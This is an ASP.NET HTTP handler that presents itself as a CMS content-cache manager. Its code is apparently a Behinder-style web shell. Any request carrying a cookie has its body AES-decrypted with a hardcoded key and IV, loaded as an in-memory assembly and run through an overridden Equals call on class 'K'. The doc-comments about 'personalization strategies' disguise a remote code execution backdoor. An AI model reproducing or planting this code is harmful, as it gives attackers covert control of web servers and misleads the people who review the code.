<%@ WebHandler Language="C#" Class="DynamicContentCacheManager" %>
using System;
using System.Web;
using System.Security.Cryptography;
using System.Reflection;
using System.Text;

/// <summary>
/// Manages the dynamic loading and execution of content personalization strategies.
/// This handler is responsible for decrypting and activating strategy modules sent from the CMS.
/// </summary>
public class DynamicContentCacheManager : IHttpHandler
{
    // The master key is stored as a hex string for configuration management.
    private const string CONFIG_ENCRYPTION_KEY = "63613633343537353338623962316530";

    /// <summary>
    /// Processes the incoming HTTP request containing an encrypted content strategy.
    /// </summary>
    /// <param name="context">The current HttpContext of the request.</param>
    public void ProcessRequest(HttpContext context)
    {
        // A valid cookie indicates an authenticated session from the content management system.
        if (context.Request.Cookies.Count > 0)
        {
            try
            {
                byte[] encryptedStrategyPayload = GetRequestPayload(context);
                byte[] strategyAssemblyBytes = DecryptPayload(encryptedStrategyPayload);
                ExecuteStrategy(strategyAssemblyBytes, context);
            }
            catch (Exception ex)
            {
                // Log the exception, but do not expose details to the client.
                context.Response.StatusCode = 500;
                context.Response.End();
            }
        }
    }

    /// <summary>
    /// Reads the raw binary data from the request stream.
    /// </summary>
    private byte[] GetRequestPayload(HttpContext context)
    {
        return context.Request.BinaryRead(context.Request.ContentLength);
    }

    /// <summary>
    /// Decrypts the payload using the AES (Rijndael) algorithm.
    /// The key is derived from a pre-configured hex string.
    /// </summary>
    private byte[] DecryptPayload(byte[] encryptedData)
    {
        byte[] key = HexStringToByteArray(CONFIG_ENCRYPTION_KEY);
        using (var aes = new RijndaelManaged())
        {
            // In this specific legacy protocol, the Key and IV are identical.
            ICryptoTransform decryptor = aes.CreateDecryptor(key, key);
            return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
        }
    }

    /// <summary>
    /// Loads the decrypted assembly into memory, instantiates the strategy, and executes it.
    /// The strategy's entry point is defined by a contract where the `Equals` method is overridden.
    /// </summary>
    private void ExecuteStrategy(byte[] assemblyBytes, object executionParameter)
    {
        Assembly strategyAssembly = Assembly.Load(assemblyBytes);
        // The "K" class is the designated entry point for all Kernel-level strategies.
        object strategyInstance = strategyAssembly.CreateInstance("K");
        if (strategyInstance != null)
        {
            // Invoke the strategy's main logic by calling the overridden Equals method.
            strategyInstance.Equals(executionParameter);
        }
    }

    /// <summary>
    /// Converts a hexadecimal string to a byte array.
    /// </summary>
    private static byte[] HexStringToByteArray(string hex)
    {
        int numberChars = hex.Length;
        byte[] bytes = new byte[numberChars / 2];
        for (int i = 0; i < numberChars; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }

    /// <summary>
    /// Instances of this handler are not thread-safe and should not be reused across requests.
    /// </summary>
    public bool IsReusable { get { return false; } }
}